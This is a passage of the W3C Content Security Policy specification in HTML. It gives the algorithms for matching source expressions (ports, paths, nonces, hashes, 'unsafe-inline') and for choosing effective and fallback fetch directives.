  (<code>.</code>)) is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①⑤">ASCII case-insensitive</a> match for the rightmost
  characters of <var>B</var>, then return "<code>Matches</code>". Otherwise, return
  "<code>Does Not Match</code>".</p>
      </ol>
     <li data-md>
      <p>If <var>A</var> is not an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①⑥">ASCII case-insensitive</a> match for <var>B</var>, return
  "<code>Does Not Match</code>".</p>
     <li data-md>
      <p>If <var>A</var> matches the <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-3.2.2" id="ref-for-section-3.2.2">IPv4address</a> rule from <a data-link-type="biblio" href="#biblio-rfc3986" title="Uniform Resource Identifier (URI): Generic Syntax">[RFC3986]</a>, and
  is not "<code>127.0.0.1</code>"; or if <var>A</var> is an <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-ipv6" id="ref-for-concept-ipv6">IPv6 address</a>, return
  "<code>Does Not Match</code>".</p>
      <p class="note" role="note"><span class="marker">Note:</span> A future version of this specification may allow literal IPv6
  and IPv4 addresses, depending on usage and demand. Given the weak
  security properties of IP addresses in relation to named hosts,
  however, authors are encouraged to prefer the latter whenever
  possible.</p>
     <li data-md>
      <p>Return "<code>Matches</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="port-part matching" data-level="6.6.2.9" id="match-ports"><span class="secno">6.6.2.9. </span><span class="content"> <code>port-part</code> matching </span><a class="self-link" href="#match-ports"></a></h5>
    <p>An <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string①①">ASCII string</a> (<var>port A</var>) <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="port-part-matches"><code>port-part</code> matches</dfn> two other <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string①②">ASCII
  strings</a> (<var>port B</var> and <var>scheme B</var>) if a CSP source expression that contained the first as a <a data-link-type="grammar" href="#grammardef-port-part" id="ref-for-grammardef-port-part②"><code>port-part</code></a> could potentially match a URL containing the latter as <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-port" id="ref-for-concept-url-port①">port</a> and <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme①③">scheme</a>. For example, "80" <a data-link-type="dfn" href="#port-part-matches" id="ref-for-port-part-matches①"><code>port-part</code> matches</a> matches "80"/"http".</p>
    <ol class="algorithm">
     <li data-md>
      <p>If <var>port A</var> is empty:</p>
      <ol>
       <li data-md>
        <p>If <var>port B</var> is the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#default-port" id="ref-for-default-port①">default port</a> for <var>scheme B</var>, return "<code>Matches</code>". Otherwise,
  return "<code>Does Not Match</code>".</p>
      </ol>
     <li data-md>
      <p>If <var>port A</var> is equal to "*", return "<code>Matches</code>".</p>
     <li data-md>
      <p>If <var>port A</var> is <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string-is" id="ref-for-string-is②">identical to</a> <var>port B</var>, return "<code>Matches</code>".</p>
     <li data-md>
      <p>If <var>port B</var> is empty:</p>
      <ol>
       <li data-md>
        <p>If <var>port A</var> is the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#default-port" id="ref-for-default-port②">default port</a> for <var>scheme B</var>, return "<code>Matches</code>". Otherwise,
  return "<code>Does not Match</code>".</p>
      </ol>
     <li data-md>
      <p>Return "<code>Does Not Match</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="path-part matching" data-level="6.6.2.10" id="match-paths"><span class="secno">6.6.2.10. </span><span class="content"> <code>path-part</code> matching </span><a class="self-link" href="#match-paths"></a></h5>
    <p>An <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string①③">ASCII string</a> (<var>path A</var>) <dfn class="dfn-paneled" data-dfn-type="dfn" data-export data-lt="path-part match" id="path-part-match"><code>path-part</code> matches</dfn> another <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string①④">ASCII string</a> (<var>path B</var>) if a CSP source expression that contained the first as a <a data-link-type="grammar" href="#grammardef-path-part" id="ref-for-grammardef-path-part③"><code>path-part</code></a> could potentially match a URL containing the latter as a <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-path" id="ref-for-concept-url-path①">path</a>.
  For example, we say that "/subdirectory/" <a data-link-type="dfn" href="#path-part-match" id="ref-for-path-part-match①"><code>path-part</code> matches</a> "/subdirectory/file".</p>
    <p class="note" role="note"><span class="marker">Note:</span> The matching relation is asymmetric. That is, <var>path A</var> matching <var>path B</var> does not mean that <var>path B</var> will match <var>path A</var>.</p>
    <ol class="algorithm">
     <li data-md>
      <p>If <var>path A</var> is empty, return "<code>Matches</code>".</p>
     <li data-md>
      <p>If <var>path A</var> consists of one character that is equal to the U+002F SOLIDUS
  character (<code>/</code>) and <var>path B</var> is empty, return "<code>Matches</code>".</p>
     <li data-md>
      <p>Let <var>exact match</var> be <code>false</code> if the final character of <var>path A</var> is the U+002F
  SOLIDUS character (<code>/</code>), and <code>true</code> otherwise.</p>
     <li data-md>
      <p>Let <var>path list A</var> and <var>path list B</var> be the result of <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#strictly-split" id="ref-for-strictly-split①">strictly splitting</a> <var>path A</var> and <var>path B</var> respectively on the U+002F SOLIDUS character (<code>/</code>).</p>
     <li data-md>
      <p>If <var>path list A</var> has more items than <var>path list B</var>, return
  "<code>Does Not Match</code>".</p>
     <li data-md>
      <p>If <var>exact match</var> is <code>true</code>, and <var>path list A</var> does not have the same
  number of items as <var>path list B</var>, return "<code>Does Not Match</code>".</p>
     <li data-md>
      <p>If <var>exact match</var> is <code>false</code>:</p>
      <ol>
       <li data-md>
        <p class="assertion">Assert: the final item in <var>path list A</var> is the empty string.</p>
       <li data-md>
        <p>Remove the final item from <var>path list A</var>.</p>
      </ol>
     <li data-md>
      <p>For each <var>piece A</var> in <var>path list A</var>:</p>
      <ol>
       <li data-md>
        <p>Let <var>piece B</var> be the next item in <var>path list B</var>.</p>
       <li data-md>
        <p>Let <var>decoded piece A</var> be the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#string-percent-decode" id="ref-for-string-percent-decode">percent-decoding</a> of <var>piece A</var>.</p>
       <li data-md>
        <p>Let <var>decoded piece B</var> be the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#string-percent-decode" id="ref-for-string-percent-decode①">percent-decoding</a> of <var>piece B</var>.</p>
       <li data-md>
        <p>If <var>decoded piece A</var> is not <var>decoded piece B</var>, return "<code>Does Not Match</code>".</p>
      </ol>
     <li data-md>
      <p>Return "<code>Matches</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.6.3" id="matching-elements"><span class="secno">6.6.3. </span><span class="content">Element Matching Algorithms</span><a class="self-link" href="#matching-elements"></a></h4>
    <h5 class="heading settled algorithm" data-algorithm="Is element nonceable?" data-level="6.6.3.1" id="is-element-nonceable"><span class="secno">6.6.3.1. </span><span class="content"> Is <var>element</var> nonceable? </span><a class="self-link" href="#is-element-nonceable"></a></h5>
    <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑨">Element</a></code> (<var>element</var>), this algorithm returns "<code>Nonceable</code>" if
  a <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source⑤"><code>nonce-source</code></a> expression can match the element (as discussed
  in <a href="#security-nonce-hijacking">§ 7.2 Nonce Hijacking</a>), and "<code>Not Nonceable</code>" if such expressions
  should not be applied.</p>
    <ol>
     <li data-md>
      <p>If <var>element</var> does not have an attribute named "<code>nonce</code>", return "<code>Not       Nonceable</code>".</p>
     <li data-md>
      <p>If <var>element</var> is a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑥">script</a></code> element, then for each <var>attribute</var> in <var>element</var>:</p>
      <ol>
       <li data-md>
        <p>If <var>attribute</var>’s name is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①⑦">ASCII case-insensitive</a> match for
  the string "<code>&lt;script</code>" or the string
  "<code>&lt;style</code>", return "<code>Not Nonceable</code>".</p>
       <li data-md>
        <p>If <var>attribute</var>’s value contains an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①⑧">ASCII case-insensitive</a> match
  the string "<code>&lt;script</code>" or the string
  "<code>&lt;style</code>", return "<code>Not Nonceable</code>".</p>
      </ol>
     <li data-md>
      <p>If <var>element</var> had a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/parsing.html#parse-error-duplicate-attribute" id="ref-for-parse-error-duplicate-attribute">duplicate-attribute</a> <a data-link-type="dfn">parse error</a> during tokenization, return
  "<code>Not Nonceable</code>".</p>
      <p class="issue" id="issue-820579ab"><a class="self-link" href="#issue-820579ab"></a> We need some sort of hook in HTML to record this error if we’re
  planning on using it here. <a href="https://github.com/whatwg/html/issues/3257">[Issue #whatwg/html#3257]</a></p>
     <li data-md>
      <p>Return "<code>Nonceable</code>".</p>
    </ol>
    <p class="issue" id="issue-4592ac7e"><a class="self-link" href="#issue-4592ac7e"></a> This processing is meant to mitigate the risk
  of dangling markup attacks that steal the nonce from an existing element
  in order to load injected script. It is fairly expensive, however, as it
  requires that we walk through all attributes and their values in order to
  determine whether the script should execute. Here, we try to minimize the
  impact by doing this check only for <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑦">script</a></code> elements when a nonce is
  present, but we should probably consider this algorithm as "at risk" until
  we know its impact. <a href="https://github.com/w3c/webappsec-csp/issues/98">[Issue #w3c/webappsec-csp#98]</a></p>
    <h5 class="heading settled algorithm" data-algorithm="Does a source list allow all inline behavior for type?" data-level="6.6.3.2" id="allow-all-inline"><span class="secno">6.6.3.2. </span><span class="content"> Does a source list allow all inline behavior for <var>type</var>? </span><a class="self-link" href="#allow-all-inline"></a></h5>
    <p>A <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⑥">source list</a> <dfn class="dfn-paneled" data-dfn-for="source list" data-dfn-type="dfn" data-export data-local-lt="allow all inline behavior" id="source-list-allows-all-inline-behavior">allows all inline behavior</dfn> of a given <var>type</var> if it contains the <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source④"><code>keyword-source</code></a> expression <a data-link-type="grammar" href="#grammardef-unsafe-inline" id="ref-for-grammardef-unsafe-inline①"><code>'unsafe-inline'</code></a>, and does not override that
  expression as described in the following algorithm:</p>
    <p>Given a <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⑦">source list</a> (<var>list</var>) and a string (<var>type</var>), the following
  algorithm returns "<code>Allows</code>" if all inline content of a given <var>type</var> is
  allowed and "<code>Does Not Allow</code>" otherwise.</p>
    <ol>
     <li data-md>
      <p>Let <var>allow all inline</var> be <code>false</code>.</p>
     <li data-md>
      <p>For each <var>expression</var> in <var>list</var>:</p>
      <ol>
       <li data-md>
        <p>If <var>expression</var> matches the <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source⑥"><code>nonce-source</code></a> or <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source⑥"><code>hash-source</code></a> grammar, return "<code>Does Not Allow</code>".</p>
       <li data-md>
        <p>If <var>type</var> is "<code>script</code>", "<code>script attribute</code>" or "<code>navigation</code>"
  and <var>expression</var> matches the <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source⑤">keyword-source</a> "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic③"><code>'strict-dynamic'</code></a>", return "<code>Does Not Allow</code>".</p>
        <p class="note" role="note"><span class="marker">Note:</span> <code>'strict-dynamic'</code> only applies to scripts, not other resource
  types. Usage is explained in more detail in <a href="#strict-dynamic-usage">§ 8.2 Usage of "'strict-dynamic'"</a>.</p>
       <li data-md>
        <p>If <var>expression</var> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①⑨">ASCII case-insensitive</a> match for the <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source⑥"><code>keyword-source</code></a> "<a data-link-type="grammar" href="#grammardef-unsafe-inline" id="ref-for-grammardef-unsafe-inline②"><code>'unsafe-inline'</code></a>",
  set <var>allow all inline</var> to <code>true</code>.</p>
      </ol>
     <li data-md>
      <p>If <var>allow all inline</var> is <code>true</code>, return "<code>Allows</code>".
  Otherwise, return "<code>Does Not Allow</code>".</p>
    </ol>
    <div class="example" id="example-c6b777a0">
     <a class="self-link" href="#example-c6b777a0"></a> <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⑧">Source lists</a> that <a data-link-type="dfn" href="#source-list-allows-all-inline-behavior" id="ref-for-source-list-allows-all-inline-behavior">allow all inline behavior</a>: 
<pre>'unsafe-inline' http://a.com http://b.com
'unsafe-inline'
</pre>
     <p><a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⑨">Source lists</a> that do not <a data-link-type="dfn" href="#source-list-allows-all-inline-behavior" id="ref-for-source-list-allows-all-inline-behavior①">allow all inline behavior</a> due to
    the presence of nonces and/or hashes, or absence of '<code>unsafe-inline</code>':</p>
<pre>'sha512-321cba' 'nonce-abc'
http://example.com 'unsafe-inline' 'nonce-abc'
</pre>
     <p><a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists②⓪">Source lists</a> that do not <a data-link-type="dfn" href="#source-list-allows-all-inline-behavior" id="ref-for-source-list-allows-all-inline-behavior②">allow all inline behavior</a> when <var>type</var> is
     '<code>script</code>' or '<code>script attribute</code>' due to the presence of
     '<code>strict-dynamic</code>', but <a data-link-type="dfn" href="#source-list-allows-all-inline-behavior" id="ref-for-source-list-allows-all-inline-behavior③">allow all inline behavior</a> otherwise:</p>
<pre>'unsafe-inline' 'strict-dynamic'
http://example.com 'strict-dynamic' 'unsafe-inline'
</pre>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="Does element match source list for type and source?" data-level="6.6.3.3" id="match-element-to-source-list"><span class="secno">6.6.3.3. </span><span class="content"> Does <var>element</var> match source list for <var>type</var> and <var>source</var>? </span><a class="self-link" href="#match-element-to-source-list"></a></h5>
    <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element①⓪">Element</a></code> (<var>element</var>), a <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists②①">source list</a> (<var>list</var>), a string
  (<var>type</var>), and a string (<var>source</var>), this algorithm returns "<code>Matches</code>" or
  "<code>Does Not Match</code>".</p>
    <p class="note" role="note"><span class="marker">Note:</span> Regardless of the encoding of the document, <var>source</var> will be converted
  to <code>UTF-8</code> before applying any hashing algorithms.</p>
    <ol>
     <li data-md>
      <p>If <a href="#allow-all-inline">§ 6.6.3.2 Does a source list allow all inline behavior for type?</a> returns "<code>Allows</code>" given <var>list</var> and <var>type</var>,
  return "<code>Matches</code>".</p>
     <li data-md>
      <p>If <var>type</var> is "<code>script</code>" or "<code>style</code>", and <a href="#is-element-nonceable">§ 6.6.3.1 Is element nonceable?</a> returns "<code>Nonceable</code>" when executed upon <var>element</var>:</p>
      <ol>
       <li data-md>
        <p>For each <var>expression</var> in <var>list</var>:</p>
        <ol>
         <li data-md>
          <p>If <var>expression</var> matches the <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source⑦"><code>nonce-source</code></a> grammar,
  and <var>element</var> has a <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" id="ref-for-attr-nonce">nonce</a></code> attribute whose value <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string-is" id="ref-for-string-is③">is</a> <var>expression</var>’s <a data-link-type="grammar" href="#grammardef-base64-value" id="ref-for-grammardef-base64-value⑥"><code>base64-value</code></a> part,
  return "<code>Matches</code>".</p>
        </ol>
      </ol>
      <p class="note" role="note"><span class="marker">Note:</span> Nonces only apply to inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑧">script</a></code> and inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element①">style</a></code>, not to
  attributes of either element or to <code>javascript:</code> navigations.</p>
     <li data-md>
      <p>Let <var>unsafe-hashes flag</var> be <code>false</code>.</p>
     <li data-md>
      <p>For each <var>expression</var> in <var>list</var>:</p>
      <ol>
       <li data-md>
        <p>If <var>expression</var> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive②⓪">ASCII case-insensitive</a> match for the <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source⑦"><code>keyword-source</code></a> "<a data-link-type="grammar" href="#grammardef-unsafe-hashes" id="ref-for-grammardef-unsafe-hashes"><code>'unsafe-hashes'</code></a>",
  set <var>unsafe-hashes flag</var> to <code>true</code>. Break out of the loop.</p>
      </ol>
     <li data-md>
      <p>If <var>type</var> is "<code>script</code>" or "<code>style</code>", or <var>unsafe-hashes flag</var> is <code>true</code>:</p>
      <ol>
       <li data-md>
        <p>Set <var>source</var> to the result of executing <a data-link-type="dfn" href="https://encoding.spec.whatwg.org/#utf-8-encode" id="ref-for-utf-8-encode">UTF-8 encode</a> on the result of executing <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#javascript-string-convert" id="ref-for-javascript-string-convert">JavaScript string converting</a> on <var>source</var>.</p>
       <li data-md>
        <p>For each <var>expression</var> in <var>list</var>:</p>
        <ol>
         <li data-md>
          <p>If <var>expression</var> matches the <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source⑦"><code>hash-source</code></a> grammar:</p>
          <ol>
           <li data-md>
            <p>Let <var>algorithm</var> be <code>null</code>.</p>
           <li data-md>
            <p>If <var>expression</var>’s <a data-link-type="grammar" href="#grammardef-hash-algorithm" id="ref-for-grammardef-hash-algorithm③"><code>hash-algorithm</code></a> part is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive②①">ASCII case-insensitive</a> match for "sha256", set <var>algorithm</var> to <a data-link-type="dfn" href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#" id="ref-for-something①">SHA-256</a>.</p>
           <li data-md>
            <p>If <var>expression</var>’s <a data-link-type="grammar" href="#grammardef-hash-algorithm" id="ref-for-grammardef-hash-algorithm④"><code>hash-algorithm</code></a> part is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive②②">ASCII case-insensitive</a> match for "sha384", set <var>algorithm</var> to <a data-link-type="dfn" href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#" id="ref-for-something②">SHA-384</a>.</p>
           <li data-md>
            <p>If <var>expression</var>’s <a data-link-type="grammar" href="#grammardef-hash-algorithm" id="ref-for-grammardef-hash-algorithm⑤"><code>hash-algorithm</code></a> part is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive②③">ASCII case-insensitive</a> match for "sha512", set <var>algorithm</var> to <a data-link-type="dfn" href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#" id="ref-for-something③">SHA-512</a>.</p>
           <li data-md>
            <p>If <var>algorithm</var> is not <code>null</code>:</p>
            <ol>
             <li data-md>
              <p>Let <var>actual</var> be the result of <a data-link-type="dfn" href="https://tools.ietf.org/html/rfc4648#section-4" id="ref-for-section-4①">base64 encoding</a> the
  result of applying <var>algorithm</var> to <var>source</var>.</p>
             <li data-md>
              <p>Let <var>expected</var> be <var>expression</var>’s <a data-link-type="grammar" href="#grammardef-base64-value" id="ref-for-grammardef-base64-value⑦"><code>base64-value</code></a> part,
  with all '<code>-</code>' characters replaced with '<code>+</code>', and all '<code>_</code>' characters
  replaced with '<code>/</code>'.</p>
              <p class="note" role="note"><span class="marker">Note:</span> This replacement normalizes hashes expressed in <a data-link-type="dfn" href="https://tools.ietf.org/html/rfc4648#section-5" id="ref-for-section-5①">base64url
  encoding</a> into <a data-link-type="dfn" href="https://tools.ietf.org/html/rfc4648#section-4" id="ref-for-section-4②">base64 encoding</a> for matching.</p>
             <li data-md>
              <p>If <var>actual</var> is <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string-is" id="ref-for-string-is④">identical to</a> <var>expected</var>, return "<code>Matches</code>".</p>
            </ol>
          </ol>
        </ol>
      </ol>
      <p class="note" role="note"><span class="marker">Note:</span> Hashes apply to inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑨">script</a></code> and inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element②">style</a></code>. If the
  "<a data-link-type="grammar" href="#grammardef-unsafe-hashes" id="ref-for-grammardef-unsafe-hashes①"><code>'unsafe-hashes'</code></a>" source expression is present,
  they will also apply to event handlers, style attributes and <code>javascript:</code> navigations.</p>
     <li data-md>
      <p>Return "<code>Does Not Match</code>".</p>
    </ol>
    <h3 class="heading settled" data-level="6.7" id="directive-algorithms"><span class="secno">6.7. </span><span class="content">Directive Algorithms</span><a class="self-link" href="#directive-algorithms"></a></h3>
    <h4 class="heading settled algorithm" data-algorithm="Get the effective directive for request" data-level="6.7.1" id="effective-directive-for-a-request"><span class="secno">6.7.1. </span><span class="content"> Get the effective directive for <var>request</var> </span><a class="self-link" href="#effective-directive-for-a-request"></a></h4>
    <p>Each <a data-link-type="dfn" href="#fetch-directives" id="ref-for-fetch-directives②">fetch directive</a> controls a specific destination of <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑥⑥">request</a>. Given
  a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑥⑦">request</a> (<var>request</var>), the following algorithm returns either <code>null</code> or the <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name①④">name</a> of the request’s <dfn class="dfn-paneled" data-dfn-for="request" data-dfn-type="dfn" data-export id="request-effective-directive">effective directive</dfn>:</p>
    <ol>
     <li data-md>
      <p>If <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-initiator" id="ref-for-concept-request-initiator①">initiator</a> is "<code>fetch</code>" or its <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination" id="ref-for-concept-request-destination⑦">destination</a> is "", return <code>connect-src</code>.</p>
     <li data-md>
      <p>If <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-initiator" id="ref-for-concept-request-initiator②">initiator</a> is "<code>prefetch</code>" or "<code>prerender</code>",
  return <code>prefetch-src</code>.</p>
     <li data-md>
      <p>Switch on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination" id="ref-for-concept-request-destination⑧">destination</a>, and execute
  the associated steps:</p>
      <dl>
       <dt data-md>"<code>manifest</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>manifest-src</code>.</p>
        </ol>
       <dt data-md>"<code>object</code>"
       <dt data-md>"<code>embed</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>object-src</code>.</p>
        </ol>
       <dt data-md>"<code>document</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>If the <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-target-browsing-context" id="ref-for-concept-request-target-browsing-context①">target browsing context</a> is a <a data-link-type="dfn">nested browsing context</a>, return <code>frame-src</code>.</p>
        </ol>
       <dt data-md>"<code>audio</code>"
       <dt data-md>"<code>track</code>"
       <dt data-md>"<code>video</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>media-src</code>.</p>
        </ol>
       <dt data-md>"<code>font</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>font-src</code>.</p>
        </ol>
       <dt data-md>"<code>image</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>img-src</code>.</p>
        </ol>
       <dt data-md>"<code>style</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>style-src-elem</code>.</p>
        </ol>
       <dt data-md>"<code>script</code>"
       <dt data-md>"<code>xslt</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>script-src-elem</code>.</p>
        </ol>
       <dt data-md>"<code>serviceworker</code>"
       <dt data-md>"<code>sharedworker</code>"
       <dt data-md>"<code>worker</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>worker-src</code>.</p>
        </ol>
      </dl>
     <li data-md>
      <p>Return <code>null</code>.</p>
    </ol>
    <h4 class="heading settled algorithm" data-algorithm="Get the effective directive for inline checks" data-level="6.7.2" id="effective-directive-for-inline-check"><span class="secno">6.7.2. </span><span class="content"> Get the effective directive for inline checks </span><a class="self-link" href="#effective-directive-for-inline-check"></a></h4>
    <p>Given a string (<var>type</var>), this algorithm returns the <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name①⑤">name</a> of the effective directive.</p>
    <p class="note" role="note"><span class="marker">Note:</span> While the <a data-link-type="dfn" href="#request-effective-directive" id="ref-for-request-effective-directive">effective directive</a> is only defined for <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑥⑧">requests</a>, in this algorithm it is used similarly to mean
  the directive that is most relevant to a particular type of inline check.</p>
    <ol>
     <li data-md>
      <p>Switch on <var>type</var>:</p>
      <dl>
       <dt data-md>"<code>script</code>"
       <dt data-md>"<code>navigation</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>script-src-elem</code>.</p>
        </ol>
       <dt data-md>"<code>script attribute</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>script-src-attr</code>.</p>
        </ol>
       <dt data-md>"<code>style</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>style-src-elem</code>.</p>
        </ol>
       <dt data-md>"<code>style attribute</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>style-src-attr</code>.</p>
        </ol>
      </dl>
     <li data-md>
      <p>Return <code>null</code>.</p>
    </ol>
    <h4 class="heading settled algorithm" data-algorithm="Get fetch directive fallback list" data-level="6.7.3" id="directive-fallback-list"><span class="secno">6.7.3. </span><span class="content"> Get fetch directive fallback list </span><a class="self-link" href="#directive-fallback-list"></a></h4>
    <p>Will return an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set④">ordered set</a> of the fallback <a data-link-type="dfn" href="#directives" id="ref-for-directives③③">directives</a> for a specific <a data-link-type="dfn" href="#directives" id="ref-for-directives③④">directive</a>.
  The returned <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set⑤">ordered set</a> is sorted from most relevant to least relevant
  and it includes the effective directive itself.</p>
    <p>Given a string (<var>directive name</var>):</p>
    <ol>
     <li data-md>
      <p>Switch on <var>directive name</var>:</p>
      <dl>
       <dt data-md>"<code>script-src-elem</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "script-src-elem", "script-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>script-src-attr</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "script-src-attr", "script-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>style-src-elem</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "style-src-elem", "style-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>style-src-attr</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "style-src-attr", "style-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>worker-src</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "worker-src", "child-src", "script-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>connect-src</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "connect-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>manifest-src</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "manifest-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>prefetch-src</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "prefetch-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>object-src</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "object-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>frame-src</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "frame-src", "child-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>media-src</code>"
       <dd data-md>
        <ol>
         <li data-md>
          <p>Return <code>&lt;&lt; "media-src", "default-src" >></code>.</p>
        </ol>
       <dt data-md>"<code>font-src</code>"
       <dd data-md>
        <ol>
         <li data-md>
